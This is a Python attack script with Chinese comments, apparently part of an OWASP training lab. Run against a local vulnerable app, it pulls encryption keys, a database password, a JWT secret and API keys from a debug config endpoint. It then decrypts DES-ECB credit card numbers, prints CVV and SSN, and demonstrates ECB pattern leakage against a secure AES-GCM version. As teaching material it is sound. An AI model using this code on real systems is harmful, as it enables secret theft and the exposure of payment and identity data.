#!/usr/bin/env python3
"""
弱加密攻擊腳本
==============
此腳本展示如何利用弱加密演算法（DES）進行解密攻擊。

攻擊原理：
---------
1. DES 使用 56-bit 金鑰，現代硬體可快速暴力破解
2. ECB 模式會洩露資料模式
3. 硬編碼的金鑰可被反編譯取得
4. 從 config API 取得金鑰後可解密所有資料

CWE-326: Inadequate Encryption Strength
CWE-321: Use of Hard-coded Cryptographic Key
CWE-329: Not Using an Unpredictable IV with CBC Mode

作者：OWASP Demo
"""

import requests
import argparse
import base64
from Crypto.Cipher import DES, AES
from Crypto.Util.Padding import unpad

# 配置
VULNERABLE_URL = "http://localhost:8081"
SECURE_URL = "http://localhost:8082"


def get_config(url: str = VULNERABLE_URL) -> dict:
    """
    從 config API 取得系統設定（含金鑰）
    """
    response = requests.get(f"{url}/api/debug/config")
    if response.status_code == 200:
        return response.json()
    return None


def decrypt_des_ecb(encrypted_data: str, key: str) -> str:
    """
    使用 DES-ECB 解密
    """
    cipher = DES.new(key.encode('utf-8'), DES.MODE_ECB)
    encrypted_bytes = base64.b64decode(encrypted_data)
    decrypted = unpad(cipher.decrypt(encrypted_bytes), DES.block_size)
    return decrypted.decode('utf-8')


def decrypt_aes_ecb(encrypted_data: str, key: str) -> str:
    """
    使用 AES-ECB 解密
    """
    # 確保金鑰是 16 bytes
    key_bytes = key.encode('utf-8')
    if len(key_bytes) < 16:
        key_bytes = key_bytes.ljust(16, b'\0')
    else:
        key_bytes = key_bytes[:16]
    
    cipher = AES.new(key_bytes, AES.MODE_ECB)
    encrypted_bytes = base64.b64decode(encrypted_data)
    decrypted = unpad(cipher.decrypt(encrypted_bytes), AES.block_size)
    return decrypted.decode('utf-8')


def attack_extract_keys():
    """
    🔴 攻擊：從 config API 取得加密金鑰
    """
    print("\n" + "=" * 60)
    print("🔴 提取加密金鑰攻擊")
    print("=" * 60)
    
    print("\n📋 步驟 1：存取 /api/debug/config...")
    
    config = get_config()
    if not config:
        print("❌ 無法取得設定")
        return None
    
    print("✅ 成功取得系統設定！")
    
    # 提取加密設定
    encryption = config.get("encryption", {})
    des_key = encryption.get("des_key")
    aes_key = encryption.get("aes_key")
    
    print("\n📋 發現的加密金鑰：")
    print(f"   DES 金鑰：{des_key}")
    print(f"   AES 金鑰：{aes_key}")
    
    # 提取其他敏感資訊
    db = config.get("database", {})
    jwt = config.get("jwt", {})
    api_keys = config.get("api_keys", {})
    
    print("\n📋 其他敏感資訊：")
    print(f"   資料庫密碼：{db.get('password')}")
    print(f"   JWT 密鑰：{jwt.get('secret')[:30]}..." if jwt.get('secret') else "")
    
    print("\n   API 金鑰：")
    for name, key in api_keys.items():
        print(f"      {name}: {key[:20]}...")
    
    return {"des_key": des_key, "aes_key": aes_key}


def attack_decrypt_credit_cards():
    """
    🔴 攻擊：使用取得的金鑰解密信用卡號
    """
    print("\n" + "=" * 60)
    print("🔴 解密信用卡攻擊")
    print("=" * 60)
    
    # 先取得金鑰
    keys = attack_extract_keys()
    if not keys:
        return
    
    des_key = keys["des_key"]
    
    print("\n📋 步驟 2：取得使用者的加密信用卡...")
    
    for user_id in [1, 2, 3]:
        response = requests.get(f"{VULNERABLE_URL}/api/users/{user_id}/sensitive")
        if response.status_code == 200:
            data = response.json()
            username = data.get("username")
            encrypted_cc = data.get("creditCardEncrypted")
            
            print(f"\n👤 使用者：{username}")
            print(f"   加密信用卡：{encrypted_cc}")
            
            if encrypted_cc and des_key:
                try:
                    decrypted = decrypt_des_ecb(encrypted_cc, des_key)
                    print(f"   ✅ 解密成功！信用卡號：{decrypted}")
                    
                    # 也顯示其他敏感資訊
                    print(f"   CVV：{data.get('cvv')}")
                    print(f"   SSN：{data.get('ssn')}")
                except Exception as e:
                    print(f"   ❌ 解密失敗：{e}")


def attack_decrypt_api_data():
    """
    🔴 攻擊：解密 API 傳輸的加密資料
    """
    print("\n" + "=" * 60)
    print("🔴 解密 API 資料攻擊")
    print("=" * 60)
    
    # 取得金鑰
    config = get_config()
    if not config:
        print("❌ 無法取得設定")
        return
    
    des_key = config.get("encryption", {}).get("des_key")
    aes_key = config.get("encryption", {}).get("aes_key")
    
    # 模擬加密一些資料
    test_data = [
        "4111111111111111",  # 信用卡號
        "password123",       # 密碼
        "secret-api-key",    # API 金鑰
    ]
    
    print("\n📋 模擬加密和解密流程：")
    
    for data in test_data:
        # 呼叫加密 API
        response = requests.post(
            f"{VULNERABLE_URL}/api/crypto/encrypt",
            json={"data": data, "algorithm": "DES"}
        )
        
        if response.status_code == 200:
            result = response.json()
            encrypted = result.get("encrypted")
            key_used = result.get("keyUsed")
            
            print(f"\n   原始資料：{data}")
            print(f"   加密後：{encrypted}")
            print(f"   ⚠️ API 洩露的金鑰：{key_used}")
            
            # 使用洩露的金鑰解密
            try:
                decrypted = decrypt_des_ecb(encrypted, key_used)
                print(f"   ✅ 解密成功：{decrypted}")
            except Exception as e:
                print(f"   ❌ 解密失敗：{e}")


def attack_ecb_pattern():
    """
    🔴 攻擊：ECB 模式圖案分析
    """
    print("\n" + "=" * 60)
    print("🔴 ECB 模式圖案分析攻擊")
    print("=" * 60)
    
    print("\n📋 ECB 模式問題：相同的明文塊產生相同的密文塊")
    print("   這會洩露資料的結構和重複模式")
    
    # 加密重複的資料
    test_cases = [
        ("AAAAAAAA", "8 個相同字元"),
        ("AAAAAAAAAAAAAAAAAAAAAAAA", "24 個相同字元（3 個塊）"),
        ("ABCDEFGH", "8 個不同字元"),
        ("ABCDEFGHABCDEFGH", "重複兩次（2 個塊）"),
    ]
    
    print("\n📋 測試 ECB 模式的重複圖案：")
    
    for data, description in test_cases:
        response = requests.post(
            f"{VULNERABLE_URL}/api/crypto/encrypt",
            json={"data": data, "algorithm": "DES"}
        )
        
        if response.status_code == 200:
            encrypted = response.json().get("encrypted")
            encrypted_bytes = base64.b64decode(encrypted)
            
            # 分析塊
            blocks = [encrypted_bytes[i:i+8] for i in range(0, len(encrypted_bytes), 8)]
            unique_blocks = len(set(blocks))
            
            print(f"\n   {description}：")
            print(f"      明文：{data}")
            print(f"      密文：{encrypted}")
            print(f"      塊數：{len(blocks)}，唯一塊：{unique_blocks}")
            
            if len(blocks) != unique_blocks:
                print(f"      ⚠️ 發現重複塊！可分析資料結構")


def compare_vulnerability():
    """
    比較漏洞版本與安全版本
    """
    print("\n" + "=" * 60)
    print("📊 加密：漏洞版本 vs 安全版本")
    print("=" * 60)
    
    test_data = "SensitiveData123"
    
    # 漏洞版本
    print("\n🔓 漏洞版本（http://localhost:8081）：")
    
    response = requests.post(
        f"{VULNERABLE_URL}/api/crypto/encrypt",
        json={"data": test_data, "algorithm": "DES"}
    )
    if response.status_code == 200:
        data = response.json()
        print(f"   演算法：{data.get('algorithm')}")
        print(f"   密文：{data.get('encrypted')}")
        print(f"   ❌ 洩露金鑰：{data.get('keyUsed')}")
    
    # 安全版本
    print("\n🔒 安全版本（http://localhost:8082）：")
    
    response = requests.post(
        f"{SECURE_URL}/api/crypto/encrypt",
        json={"data": test_data}
    )
    if response.status_code == 200:
        data = response.json()
        print(f"   演算法：{data.get('algorithm')}")
        print(f"   密文：{data.get('encrypted')[:50]}...")
        print(f"   ✅ 不洩露金鑰")
        print(f"   ✅ IV 包含在密文中：{data.get('ivIncluded')}")
    else:
        print(f"   回應：{response.status_code}")
    
    # 測試 config API
    print("\n📋 Config API 測試：")
    
    print("\n🔓 漏洞版本 /api/debug/config：")
    response = requests.get(f"{VULNERABLE_URL}/api/debug/config")
    if response.status_code == 200:
        print("   ❌ 可存取！曝露所有敏感設定")
    else:
        print(f"   回應：{response.status_code}")
    
    print("\n🔒 安全版本 /api/debug/config：")
    response = requests.get(f"{SECURE_URL}/api/debug/config")
    if response.status_code == 200:
        print("   ⚠️ 可存取（應該禁用或需要權限）")
    elif response.status_code in [403, 404]:
        print(f"   ✅ 被拒絕或不存在：{response.status_code}")
    else:
        print(f"   回應：{response.status_code}")
    
    print("\n📋 比較：")
    print("   ╔═══════════════╦════════════════════╦════════════════════╗")
    print("   ║ 項目          ║ 漏洞版本           ║ 安全版本           ║")
    print("   ╠═══════════════╬════════════════════╬════════════════════╣")
    print("   ║ 演算法        ║ DES（56-bit）      ║ AES-256-GCM        ║")
    print("   ║ 模式          ║ ECB（不安全）      ║ GCM（認證加密）    ║")
    print("   ║ IV            ║ 無                 ║ 隨機 12 bytes      ║")
    print("   ║ 金鑰儲存      ║ 硬編碼在程式碼     ║ 環境變數           ║")
    print("   ║ 金鑰洩露      ║ ❌ API 回傳金鑰    ║ ✅ 不曝露          ║")
    print("   ║ Config API    ║ ❌ 曝露敏感設定    ║ ✅ 禁用/權限控制   ║")
    print("   ╚═══════════════╩════════════════════╩════════════════════╝")


def main():
    parser = argparse.ArgumentParser(
        description="弱加密攻擊工具",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
範例：
  python weak_encryption.py --keys        # 提取加密金鑰
  python weak_encryption.py --decrypt     # 解密信用卡號
  python weak_encryption.py --api         # 解密 API 資料
  python weak_encryption.py --ecb         # ECB 模式分析
  python weak_encryption.py --compare     # 比較漏洞/安全版本
  python weak_encryption.py --all         # 執行完整演示
        """
    )
    
    parser.add_argument("--keys", action="store_true", help="提取加密金鑰")
    parser.add_argument("--decrypt", action="store_true", help="解密信用卡號")
    parser.add_argument("--api", action="store_true", help="解密 API 資料")
    parser.add_argument("--ecb", action="store_true", help="ECB 模式分析")
    parser.add_argument("--compare", action="store_true", help="比較漏洞/安全版本")
    parser.add_argument("--all", action="store_true", help="執行完整演示")
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("🔐 弱加密攻擊工具")
    print("=" * 60)
    print(f"⚠️ 此工具僅供教育目的！請勿用於非法活動。")
    
    if args.all:
        attack_extract_keys()
        attack_decrypt_credit_cards()
        attack_decrypt_api_data()
        attack_ecb_pattern()
        compare_vulnerability()
    elif args.keys:
        attack_extract_keys()
    elif args.decrypt:
        attack_decrypt_credit_cards()
    elif args.api:
        attack_decrypt_api_data()
    elif args.ecb:
        attack_ecb_pattern()
    elif args.compare:
        compare_vulnerability()
    else:
        parser.print_help()
        print("\n💡 快速開始：python weak_encryption.py --all")
    
    print("\n📦 需要安裝：pip install pycryptodome")


if __name__ == "__main__":
    main()
